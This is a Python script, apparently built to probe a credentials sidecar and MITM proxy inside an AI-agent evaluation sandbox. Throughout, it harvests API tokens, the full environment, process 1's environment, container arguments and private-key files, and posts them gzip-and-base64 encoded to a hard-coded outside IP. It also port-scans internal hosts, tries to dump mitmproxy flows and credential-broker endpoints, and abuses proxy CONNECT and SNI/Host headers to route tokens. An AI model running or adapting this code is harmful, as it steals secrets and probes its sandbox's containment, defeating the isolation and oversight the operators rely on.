"""i244: probe the Harbor gateway-mode credentials sidecar (172.20.29.127).

Runs pre-ACP, dumps static state, triggers provider requests through the
transparent MITM, sweeps the sidecar, fingerprints every open port (incl.
mitmproxy web UI /flows and credential-broker APIs), exercises proxy CONNECT /
Host-SNI manipulation, and full-scans the sidecar.  All exfil is gzip+b64.
"""
import base64
import gzip
import json
import os
import re
import socket
import ssl
import subprocess
import sys
import tempfile
import time
from concurrent.futures import ThreadPoolExecutor

CANARY = "http://109.238.87.4:18077"
CA = "/tmp/harbor-sidecar-ca.pem"
DEADLINE = time.time() + 110.0
SIDE = "172.20.29.127"
MAIN = "172.20.29.126"

TOKEN = (os.environ.get("ANTHROPIC_API_KEY")
         or os.environ.get("OPENAI_API_KEY")
         or os.environ.get("HOSTED_INFERENCE_TOKEN") or "")
HOSTED_URL = os.environ.get("HOSTED_INFERENCE_URL") or ""


def left():
    return max(1.0, DEADLINE - time.time())


def b64(data):
    if isinstance(data, str):
        data = data.encode("utf-8", "replace")
    return base64.b64encode(data).decode()


def _trunc(obj, slimit=20000, nlimit=300, depth=0):
    if depth > 8:
        return "..."
    if isinstance(obj, str):
        return obj[:slimit]
    if isinstance(obj, bytes):
        return b64(obj[:slimit])
    if isinstance(obj, dict):
        return {str(k)[:200]: _trunc(v, slimit, nlimit, depth + 1)
                for k, v in list(obj.items())[:nlimit]}
    if isinstance(obj, (list, tuple)):
        return [_trunc(v, slimit, nlimit, depth + 1) for v in obj[:nlimit]]
    return obj


def post(part, obj):
    try:
        raw = gzip.compress(json.dumps(_trunc(obj), default=str).encode())
        body = json.dumps({"part": part, "d": base64.b64encode(raw).decode(),
                           "ts": time.time()}).encode()
        req = urllib_request(CANARY + "/i244/" + part, body)
        urllib.urlopen(req, timeout=6).read()
    except Exception:
        pass


import urllib.request as urllib  # noqa: E402


def urllib_request(url, body):
    return urllib.Request(url, data=body, method="POST",
                          headers={"Content-Type": "application/json",
                                   "User-Agent": "i244probe"})


def read(path, limit=262144):
    try:
        with open(path, "rb") as f:
            return f.read(limit).decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001
        return "ERR %r" % (exc,)


def cmd(args, timeout=5):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout, text=True)
        return {"argv": args, "rc": p.returncode, "out": p.stdout[:12000],
                "err": p.stderr[:2000]}
    except Exception as exc:  # noqa: BLE001
        return {"argv": args, "err": repr(exc)}


# ---------------------------------------------------------------- raw network
def tls_sock(host, port, sni=None, timeout=3, verify=False):
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    if verify:
        ctx = ssl.create_default_context()
        if os.path.exists(CA):
            ctx.load_verify_locations(CA)
    else:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(s, server_hostname=sni or host)


def raw_exchange(host, port, payload, timeout=3, tls=False, sni=None,
                 read_limit=32768):
    s = None
    rec = {}
    try:
        if tls:
            s = tls_sock(host, port, sni=sni, timeout=timeout)
            try:
                rec["peer"] = s.getpeername()
                rec["cert"] = s.getpeercert()
            except Exception:  # noqa: BLE001
                pass
        else:
            s = socket.create_connection((host, port), timeout=timeout)
            s.settimeout(timeout)
            rec["peer"] = s.getpeername()
        s.sendall(payload)
        data = b""
        while len(data) < read_limit:
            try:
                c = s.recv(min(8192, read_limit - len(data)))
            except socket.timeout:
                break
            if not c:
                break
            data += c
            if b"\r\n\r\n" in data and len(data) > 2048:
                # best-effort: stop once body likely complete
                head, _, body = data.partition(b"\r\n\r\n")
                m = re.search(br"(?i)content-length:\s*(\d+)", head)
                if m and len(body) >= int(m.group(1)):
                    break
        rec["len"] = len(data)
        rec["raw_b64"] = b64(data[:read_limit])
        rec["head"] = data.split(b"\r\n\r\n", 1)[0].decode("latin1", "replace")[:2500]
        return rec
    except Exception as exc:  # noqa: BLE001
        rec["err"] = repr(exc)
        return rec
    finally:
        try:
            if s:
                s.close()
        except Exception:  # noqa: BLE001
            pass


def http_get(host, port, path, host_hdr=None, token=None, method="GET",
             extra_headers=None, tls=False, sni=None, timeout=3, body=None):
    hh = host_hdr or (host if port in (80, 443) else "%s:%d" % (host, port))
    lines = ["%s %s HTTP/1.1" % (method, path), "Host: " + hh,
             "User-Agent: Mozilla/5.0 i244", "Accept: */*", "Connection: close"]
    if token:
        lines.append("Authorization: Bearer " + token)
        lines.append("x-api-key: " + token)
    if body is not None:
        lines.append("Content-Type: application/json")
        lines.append("Content-Length: " + str(len(body)))
    for k, v in (extra_headers or {}).items():
        lines.append("%s: %s" % (k, v))
    raw = ("\r\n".join(lines) + "\r\n\r\n").encode() + (body or b"")
    return raw_exchange(host, port, raw, timeout=timeout, tls=tls, sni=sni)


# ---------------------------------------------------------------- static dump
def scan_files():
    hits = []
    roots = ["/opt/harbor-acp-tools", "/opt/harbor-acp-python",
             "/opt/harbor-acp-bootstrap-cache", "/root", "/tmp", "/logs",
             "/run", "/var/run", "/etc", "/usr/local/share/ca-certificates",
             "/__modal", "/app"]
    pats = [b"sk-harbor", b"ANTHROPIC_API_KEY", b"mitmproxy",
             b"BEGIN PRIVATE KEY", b"BEGIN RSA PRIVATE KEY"]
    seen = 0
    for root in roots:
        if left() < 60:
            break
        for dirpath, dirnames, filenames in os.walk(root):
            if left() < 60:
                break
            depth = dirpath[len(root):].count(os.sep)
            if depth > 5:
                dirnames[:] = []
                continue
            if dirpath.endswith(("node_modules", "site-packages", "__pycache__")):
                dirnames[:] = []
                continue
            for fn in filenames:
                if seen > 4000 or len(hits) > 100:
                    break
                fp = os.path.join(dirpath, fn)
                seen += 1
                try:
                    st = os.lstat(fp)
                    if not os.path.isfile(fp) or st.st_size > 1_000_000:
                        continue
                    with open(fp, "rb") as f:
                        blob = f.read(1_000_000)
                except Exception:  # noqa: BLE001
                    continue
                for pat in pats:
                    if pat in blob:
                        idx = blob.find(pat)
                        hits.append({"path": fp, "size": st.st_size, "pat": pat.decode(),
                                     "snip_b64": b64(blob[max(0, idx - 200):idx + 800])})
                        break
    return {"walked": seen, "hits": hits}


def static_info():
    listening = []
    for fn in ("/proc/net/tcp", "/proc/net/tcp6"):
        for line in read(fn).splitlines()[1:]:
            f = line.split()
            if len(f) > 3 and f[3] == "0A":
                listening.append({"file": fn, "local": f[1],
                                  "uid": f[7] if len(f) > 7 else ""})
    info = {
        "ts": time.time(), "mode": os.environ.get("I244_MODE", ""),
        "token_len": len(TOKEN), "token_b64": b64(TOKEN),
        "hosted_url": HOSTED_URL,
        "hosted_token_len": len(os.environ.get("HOSTED_INFERENCE_TOKEN") or ""),
        "env": dict(os.environ),
        "etc_hosts": read("/etc/hosts"),
        "resolv": read("/etc/resolv.conf"),
        "route": read("/proc/net/route"),
        "tcp": read("/proc/net/tcp"), "tcp6": read("/proc/net/tcp6"),
        "udp": read("/proc/net/udp"),
        "listening_hex": listening,
        "uname": cmd(["uname", "-a"]),
        "id": cmd(["id"]),
        "tmp_ls": cmd(["ls", "-la", "/tmp"]),
        "logs_ls": cmd(["sh", "-c", "find /logs -maxdepth 3 -type f 2>/dev/null | head -50"]),
        "modal_top": cmd(["ls", "-la", "/__modal"]),
        "modal_mounts": cmd(["sh", "-c", "find /__modal/mounts /__modal/.task-startup "
                                         "/__modal/.debug_shell -maxdepth 3 2>/dev/null | head -120"]),
        "container_args_b64": b64(read("/__modal/.container-arguments/data.bin", 300000)),
        "container_args_strings": cmd(["sh", "-c", "strings /__modal/.container-arguments/data.bin "
                                                    "2>/dev/null | head -80"]),
        "opt_tools": cmd(["sh", "-c", "find /opt/harbor-acp-tools /opt/harbor-acp-python "
                                       "/opt/harbor-acp-bootstrap-cache -maxdepth 4 2>/dev/null | head -150"]),
        "proc1": {"cmdline": read("/proc/1/cmdline").replace("\x00", " "),
                  "environ_b64": b64(read("/proc/1/environ")),
                  "mountinfo": read("/proc/1/mountinfo", 60000)},
        "ca": {"exists": os.path.exists(CA), "size": os.path.getsize(CA) if os.path.exists(CA) else 0,
               "head_b64": b64(read(CA, 4096))},
        "ca_dirs": cmd(["sh", "-c", "ls -la /usr/local/share/ca-certificates /etc/ssl/certs 2>/dev/null | head -80"]),
        "privkey_search": cmd(["sh", "-c", "grep -rl 'BEGIN \\(RSA \\)\\?PRIVATE KEY' /tmp /etc /opt /root /run /logs 2>/dev/null | head -20"]),
        "getent": cmd(["sh", "-c", "for h in main credentials credentials.harbor credentials.local "
                                    "sidecar sidecar.harbor inference gateway; do echo =$h; getent hosts $h; done"]),
        "proc_list": cmd(["sh", "-c", "for p in /proc/[0-9]*; do c=$(tr '\\0' ' ' <$p/cmdline 2>/dev/null); "
                                       "[ -n \"$c\" ] && echo \"$p $c\"; done | head -60"]),
    }
    post("static", info)
    return info


# ---------------------------------------------------------------- provider
def anth_body():
    return json.dumps({"model": "claude-3-5-sonnet-latest", "max_tokens": 8,
                       "messages": [{"role": "user", "content": "hi"}]}).encode()


def trigger_provider():
    recs = []
    if not TOKEN:
        post("provider", {"probes": [], "note": "no token"})
        return
    ab = anth_body()
    # anth POST 443 verified + unverified
    recs.append({"t": "anth443-unverified",
                 "r": http_get("api.anthropic.com", 443, "/v1/messages", "api.anthropic.com",
                               TOKEN, method="POST", tls=True,
                               extra_headers={"anthropic-version": "2023-06-01",
                                              "content-type": "application/json"},
                               body=ab, timeout=6)})
    recs.append({"t": "anth443-plain80",
                 "r": http_get("api.anthropic.com", 80, "/v1/messages", "api.anthropic.com",
                               TOKEN, method="POST", tls=False,
                               extra_headers={"anthropic-version": "2023-06-01",
                                              "content-type": "application/json"},
                               body=ab, timeout=4)})
    recs.append({"t": "openai443-models",
                 "r": http_get("api.openai.com", 443, "/v1/models", "api.openai.com",
                               TOKEN, tls=True, timeout=5)})
    recs.append({"t": "openai80-models",
                 "r": http_get("api.openai.com", 80, "/v1/models", "api.openai.com",
                               TOKEN, tls=False, timeout=4)})
    recs.append({"t": "openai443-chat",
                 "r": http_get("api.openai.com", 443, "/v1/chat/completions",
                               "api.openai.com", TOKEN, method="POST", tls=True,
                               extra_headers={"Content-Type": "application/json"},
                               body=json.dumps({"model": "gpt-4o-mini", "max_tokens": 4,
                                                "messages": [{"role": "user", "content": "hi"}]}).encode(),
                               timeout=6)})
    post("provider", {"probes": recs, "deadline_left": left()})


# ---------------------------------------------------------------- scanning
def scan_host(host, ports, timeout=0.12, workers=400):
    opens = []

    def one(p):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            if s.connect_ex((host, p)) == 0:
                return p
        except Exception:  # noqa: BLE001
            return None
        finally:
            try:
                s.close()
            except Exception:  # noqa: BLE001
                pass
        return None

    with ThreadPoolExecutor(max_workers=workers) as ex:
        for r in ex.map(one, ports, chunksize=64):
            if r:
                opens.append(r)
    return sorted(opens)


TARGETED = [
    22, 25, 53, 67, 68, 80, 81, 88, 110, 143, 389, 443, 445, 465, 587, 636,
    873, 990, 993, 995, 1080, 1433, 1521, 2049, 2375, 2376, 2379, 2380, 3128,
    3000, 3001, 3306, 4000, 4143, 4172, 4242, 4343, 4500, 5000, 5001, 5002,
    50051, 50052, 50053, 5432, 5672, 6379, 7000, 7001, 7070, 7071, 8000, 8001,
    8002, 8005, 8008, 8009, 8010, 8011, 8012, 8013, 8014, 8015, 8016, 8017,
    8018, 8020, 8021, 8022, 8030, 8040, 8050, 8053, 8055, 8060, 8069, 8070,
    8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8091,
    8092, 8093, 8094, 8095, 8100, 8118, 8123, 8200, 8300, 8400, 8443, 8444,
    8445, 8500, 8529, 8555, 8600, 8666, 8800, 8880, 8888, 8899, 8983, 9000,
    9001, 9002, 9009, 9010, 9042, 9080, 9090, 9091, 9092, 9093, 9094, 9100,
    9115, 9200, 9300, 9411, 9443, 9999, 10000, 10250, 10255, 10256, 10443,
    10500, 11000, 11211, 11434, 12201, 13306, 14000, 15000, 15001, 15006,
    15010, 15020, 15021, 15090, 15099, 15672, 16000, 16379, 17000, 18000,
    18001, 18080, 18081, 18082, 18083, 18084, 18085, 18086, 18087, 18088,
    18089, 18090, 18100, 19000, 19100, 20000, 22222, 28080, 29001, 30000,
    32400, 32678, 32768, 32770, 33000, 33333, 34567, 40000, 44300, 44818,
    47001, 48080, 48081, 49152, 50000, 50051, 50052, 50100, 50500, 55000,
    5601, 6000, 6001, 6379, 6443, 6464, 6666, 7002, 7547, 7687, 7777, 8006,
    808, 888, 909, 911, 999, 1000, 1001, 1111, 1234, 1337, 2000, 2022, 2080,
    2082, 2083, 2086, 2087, 2095, 2096, 2121, 2181, 2222, 2377, 2381, 2480,
    2601, 2602, 2604, 3005, 3006, 3111, 3222, 3333, 3389, 3690, 3780, 4001,
    4002, 4040, 4141, 4200, 4343, 4443, 4444, 4505, 4506, 4664, 4711, 4786,
    4848, 5005, 5010, 5011, 5222, 5269, 5357, 5433, 5500, 5600, 5602, 5666,
    5800, 5801, 5802, 5900, 5901, 5984, 5985, 5986, 5988, 5989, 6002, 6003,
    6080, 6081, 6444, 6500, 6660, 6661, 6662, 6663, 6664, 6665, 6666, 6667,
    6668, 6669, 7003, 7004, 7005, 7006, 7007, 7008, 7009, 7010, 7020, 7030,
    7443, 7474, 7500, 7548, 7778, 7780, 7800, 7880, 7890, 7900, 7920, 8003,
    8004, 8007, 8019, 8025, 8026, 8035, 8042, 8043, 8044, 8045, 8046, 8047,
    8048, 8049, 8051, 8052, 8054, 8056, 8057, 8058, 8059, 8061, 8062, 8063,
    8064, 8065, 8066, 8067, 8068, 8071, 8072, 8073, 8074, 8075, 8076, 8077,
    8078, 8079, 8096, 8097, 8098, 8099, 8124, 8125, 8126, 8180, 8181, 8182,
    8188, 8243, 8244, 8280, 8301, 8302, 8333, 8380, 8402, 8446, 8447, 8448,
    8449, 8450, 8460, 8470, 8480, 8490, 8510, 8520, 8530, 8540, 8550, 8554,
    8560, 8570, 8580, 8590, 8601, 8610, 8620, 8630, 8640, 8650, 8660, 8661,
    8662, 8663, 8664, 8665, 8667, 8668, 8669, 8670, 8671, 8672, 8673, 8674,
    8675, 8676, 8677, 8678, 8679, 8680, 8681, 8682, 8683, 8684, 8685, 8686,
    8687, 8688, 8689, 8690, 8691, 8692, 8693, 8694, 8695, 8696, 8697, 8698,
    8699, 8700, 8701, 8801, 8808, 8811, 8822, 8833, 8844, 8855, 8866, 8877,
    8881, 8882, 8883, 8884, 8885, 8886, 8887, 8889, 8890, 8891, 8892, 8893,
    8894, 8895, 8896, 8897, 8898, 8900, 8910, 8920, 8930, 8940, 8950, 8960,
    8970, 8980, 8989, 8990, 8991, 8992, 8993, 8994, 8995, 8996, 8997, 8998,
    8999, 9020, 9030, 9040, 9050, 9060, 9070, 9081, 9095, 9096, 9097, 9098,
    9099, 9101, 9102, 9103, 9104, 9105, 9106, 9107, 9108, 9109, 9110, 9111,
]

MITM_PATHS = ["/flows", "/flows/", "/flows.json", "/flows/dump", "/flows/export",
              "/version", "/state", "/options", "/events", "/processes",
              "/info", "/status", "/api/flows", "/api/v1/flows", "/whoami",
              "/server_info", "/state/options", "/websocket", "/updates"]
CRED_PATHS = ["/", "/health", "/healthz", "/ready", "/readyz", "/livez", "/metrics",
              "/version", "/whoami", "/identify", "/v1/models", "/v1/credential",
              "/v1/credentials", "/credentials", "/credential", "/v1/secret",
              "/v1/secrets", "/secret", "/secrets", "/resolve", "/v1/resolve",
              "/exchange", "/v1/exchange", "/token", "/v1/token", "/keys",
              "/v1/keys", "/key", "/v1/key", "/api/v1/credentials", "/api/credentials",
              "/api/health", "/api/version", "/openapi.json", "/swagger.json",
              "/config", "/debug", "/admin", "/api", "/internal", "/_admin",
              "/grpc.health.v1.Health/Check", "/v1/inference", "/v1/relay",
              "/v1/proxy", "/proxy", "/inference", "/relay", "/grant", "/v1/grant",
              "/v1/token/exchange", "/v1/CredentialService/GetCredential",
              "/harbor.v1.CredentialService/GetCredential"]


def fingerprint(open_list, quick=False):
    recs = []
    mitm_ids = {}
    for op in open_list:
        if left() < 18:
            break
        h, p = op["host"], op["port"]
        is_tls = p in (443, 8443, 9443, 6443, 4143)
        # proxy-ish methods on likely proxy ports
        if p in (80, 443, 8080, 8081, 8082, 8083, 3128, 8888, 1080, 1087,
                 8000, 8001, 8008, 9090, 9000, 4000, 15000, 15001, 15006):
            if left() > 15:
                for kind, payload in (
                        ("abs-form", ("GET http://api.anthropic.com/v1/models HTTP/1.1\r\n"
                                      "Host: api.anthropic.com\r\n"
                                      "Proxy-Authorization: Bearer %s\r\n"
                                      "Authorization: Bearer %s\r\nConnection: close\r\n\r\n"
                                      % (TOKEN, TOKEN)).encode()),
                        ("connect", ("CONNECT api.anthropic.com:443 HTTP/1.1\r\n"
                                     "Host: api.anthropic.com:443\r\n"
                                     "Proxy-Authorization: Bearer %s\r\n\r\n" % TOKEN).encode()),
                        ("abs-canary", ("GET http://109.238.87.4:18077/i244_proxytest HTTP/1.1\r\n"
                                        "Host: 109.238.87.4:18077\r\n"
                                        "Proxy-Authorization: Bearer %s\r\nConnection: close\r\n\r\n"
                                        % TOKEN).encode())):
                    recs.append({"host": h, "port": p, "kind": kind,
                                 "resp": raw_exchange(h, p, payload, timeout=2.5, tls=is_tls)})
        # mitmproxy web UI
        if not quick:
            for path in MITM_PATHS:
                if left() < 12:
                    break
                r = http_get(h, p, path, "127.0.0.1", None, tls=is_tls, timeout=2)
                recs.append({"host": h, "port": p, "path": path, "k": "mitm", "resp": r})
                body = None
                try:
                    raw = base64.b64decode(r.get("raw_b64", ""))
                    body = raw.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in raw else b""
                except Exception:  # noqa: BLE001
                    body = b""
                if r.get("head", "").split("\r\n")[0].endswith("200 OK") and path in ("/flows", "/flows/", "/api/flows", "/api/v1/flows"):
                    try:
                        j = json.loads(body.decode("latin1"))
                        data = j.get("data") if isinstance(j, dict) else j
                        if isinstance(data, list) and data:
                            ids = [str(x.get("id")) for x in data if isinstance(x, dict) and x.get("id")]
                            mitm_ids[(h, p)] = ids[:40]
                    except Exception:  # noqa: BLE001
                        pass
                if r.get("head", "").split("\r\n")[0].endswith("200 OK") and path not in ("/", "/version"):
                    if len(body) > 60:
                        break
            # credential broker API paths
            for path in CRED_PATHS:
                if left() < 10:
                    break
                r = http_get(h, p, path, None, TOKEN, tls=is_tls, timeout=2)
                head0 = r.get("head", "").split("\r\n")[0]
                if " 404" in head0 or " 400" in head0 or " 405" in head0:
                    continue
                recs.append({"host": h, "port": p, "path": path, "k": "cred", "resp": r})
    # pull any discovered mitmweb flows (full request/response data)
    flowdumps = []
    for (h, p), ids in mitm_ids.items():
        for fid in ids[:25]:
            if left() < 8:
                break
            for suffix in ("/flows/" + fid, "/flows/" + fid + "/request",
                           "/flows/" + fid + "/request/content"):
                r = http_get(h, p, suffix, "127.0.0.1", None, tls=(p in (443, 8443, 9443)), timeout=2)
                flowdumps.append({"host": h, "port": p, "path": suffix, "resp": r})
                if r.get("len", 0) > 0:
                    break
    post("fingerprint", {"probes": recs, "mitm_flows": flowdumps,
                         "mitm_ids": {("%s:%s" % k): v for k, v in mitm_ids.items()},
                         "deadline_left": left()})


def sni_tests():
    recs = []
    tests = [
        ("api.anthropic.com", "api.anthropic.com"),
        ("api.anthropic.com", "109.238.87.4:18077"),
        ("api.anthropic.com", "172.20.29.127"),
        ("api.openai.com", "api.openai.com"),
        ("openrouter.ai", "api.anthropic.com"),
        ("generativelanguage.googleapis.com", "api.anthropic.com"),
        ("109.238.87.4", "api.anthropic.com"),
    ]
    ab = anth_body()
    for sni, hh in tests:
        if left() < 10:
            break
        for port in (443, 8443):
            if left() < 8:
                break
            payload = ("POST /v1/messages HTTP/1.1\r\nHost: %s\r\n"
                       "x-api-key: %s\r\nAuthorization: Bearer %s\r\n"
                       "anthropic-version: 2023-06-01\r\ncontent-type: application/json\r\n"
                       "Content-Length: %d\r\nConnection: close\r\n\r\n"
                       % (hh, TOKEN, TOKEN, len(ab))).encode() + ab
            recs.append({"sni": sni, "host_hdr": hh, "port": port,
                         "resp": raw_exchange(SIDE, port, payload, timeout=3, tls=True, sni=sni)})
    post("sni", {"probes": recs, "deadline_left": left()})


def grpc_probe(host, port, tls=False):
    pre = (b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
    r = raw_exchange(host, port, pre, timeout=2, tls=tls, read_limit=2048)
    r2 = http_get(host, port, "/grpc.health.v1.Health/Check", None, TOKEN, method="POST",
                  extra_headers={"Content-Type": "application/grpc", "TE": "trailers"},
                  body=b"\x00\x00\x00\x00\x00", tls=tls, timeout=2)
    return {"h2c_preface": r, "grpc_http1": r2}


def main():
    static_info()
    # /__modal args + file scan merged into static to save time
    scan = scan_files()
    post("files", scan)
    trigger_provider()
    # targeted sweep both sidecar and main
    opens = []
    if left() > 55:
        scan_out = {}
        tuned = sorted(set(TARGETED))
        for host in (SIDE, MAIN):
            if left() < 55:
                break
            scan_out[host] = scan_host(host, tuned, timeout=0.12, workers=256)
            opens += [{"host": host, "port": p} for p in scan_out[host]]
        post("scan_targeted", {"opens": scan_out, "deadline_left": left()})
    # fingerprint
    fingerprint(opens)
    # SNI/host manipulation
    if left() > 25:
        sni_tests()
    # full scan of the credentials sidecar
    full = {}
    if left() > 20:
        full[SIDE] = scan_host(SIDE, list(range(1, 65536)), timeout=0.10, workers=512)
        post("scan_full_side", {"opens": full[SIDE], "deadline_left": left()})
    if left() > 15:
        full[MAIN] = scan_host(MAIN, list(range(1, 32769)), timeout=0.10, workers=512)
        post("scan_full_main", {"opens": full[MAIN], "deadline_left": left()})
    # fingerprint newly found ports
    known = {(o["host"], o["port"]) for o in opens}
    new = [{"host": h, "port": p} for h, ps in full.items() for p in ps
           if (h, p) not in known]
    if new:
        fingerprint(new, quick=False)
    # gRPC probes on common ports
    grecs = []
    for host in (SIDE, MAIN):
        for port in (50051, 50052, 80, 443, 9090, 8080, 9000):
            if left() < 6:
                break
            if any(o["port"] == port and o["host"] == host for o in opens + new):
                grecs.append({"host": host, "port": port,
                              "r": grpc_probe(host, port, tls=(port in (443,))) } )
    post("grpc", {"probes": grecs, "deadline_left": left()})
    post("done", {"deadline_left": left()})
    sys.stderr.write("i244 token_len=%d hosted=%s\n" % (len(TOKEN), bool(HOSTED_URL)))
    sys.stderr.flush()
    os._exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001
        import traceback
        post("fatal", {"err": repr(exc), "tb": traceback.format_exc()})
    try:
        post("done2", {"deadline_left": left()})
    except Exception:  # noqa: BLE001
        pass
    os._exit(0)
